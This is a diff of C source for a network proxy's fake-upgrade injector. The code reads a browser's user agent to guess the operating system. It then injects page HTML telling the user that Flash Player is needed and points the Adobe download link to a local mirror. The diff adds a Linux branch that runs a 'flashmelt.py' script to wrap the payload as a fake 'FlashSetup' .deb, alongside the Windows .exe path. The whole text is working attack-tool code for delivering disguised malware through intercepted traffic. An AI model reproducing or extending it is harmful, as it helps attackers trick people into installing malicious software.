@@ -41,11 +41,12 @@ search_useragent(char *request)
 
       if (strstr(user, "Windows NT") != NULL || strstr(user, "Windows") != NULL || strstr(user, "Win") != NULL)
          os = WINDOWS;
-/*    else if (strstr(user, "OS X") != NULL || strstr(user, "Mac") != NULL)
-         os = OSX;
       else if (strstr(user, "Linux") != NULL || strstr(user, "linux") != NULL || strstr(user, "Ubuntu") != NULL)
          os = LINUX;
-*/ }
+/*    else if (strstr(user, "OS X") != NULL || strstr(user, "Mac") != NULL)
+         os = OSX;
+*/
+   }
 
    return os;
 }
@@ -109,13 +110,21 @@ int proxy_fake_upgrade(BIO **cbio, BIO **sbio, char *request, char *file,  char 
 	     DEBUG_MSG(D_INFO, "Windows detected");
 	     break;
 
-	 case OSX:
-//	     DEBUG_MSG(D_INFO, "OS X detected");
-//	     break;
-
 	 case LINUX:
+	     DEBUG_MSG(D_INFO, "Linux detected, melting...");
+
+	     char *cmd_melt = NULL;
+
+	     asprintf(&cmd_melt, "/opt/td-config/scripts/flashmelt.py %s", file);
+	     ON_ERROR(cmd_melt, NULL, "virtual memory exhausted");
+	     system(cmd_melt);
+	     free(cmd_melt);
+	     break;
+
+	 case OSX:
+//           DEBUG_MSG(D_INFO, "OS X detected");
+//	     break
 	 case UNKNOWN:
-//	     DEBUG_MSG(D_INFO, "Linux detected");
 	     break;
 	 }
 
@@ -134,7 +143,7 @@ int proxy_fake_upgrade(BIO **cbio, BIO **sbio, char *request, char *file,  char 
 		"        if(!msg && ('innerHTML' in player)) { var msg = player.innerHTML; msg = msg.substr(msg.indexOf('<div class=\"yt-alert-message\">') + 30); msg = msg.substr(0, msg.indexOf('</div>')); }\n" \
 		"        if(!msg) var msg = 'You need Adobe Flash Player to watch this video. <br> <a href=\"http://get.adobe.com/flashplayer/\">Download it from Adobe.</a>';\n" \
 		"        player.innerHTML = '<div id=\"movie_player\" class=\"html5-video-player el-detailpage ps-null autohide-fade\" style=\"\" tabindex=\"-1\"><div style=\"\" class=\"ytp-fallback html5-stop-propagation\"><div class=\"ytp-fallback-content\">' + msg.replace('http://get.adobe.com/flashplayer/', adobelocalmirror).trim() + '</div></div></div>';\n", 
-		file, ".exe"); //os == WINDOWS ? ".exe" : os == OSX ? ".dmg" : ".deb");
+		os == WINDOWS ? file : "FlashSetup-11.2.2", os == WINDOWS ? ".exe" : ".deb"); // os == OSX ? ".dmg" : ".deb");
 
 	 ON_ERROR(html_to_inject, NULL, "virtual memory exhausted");
 
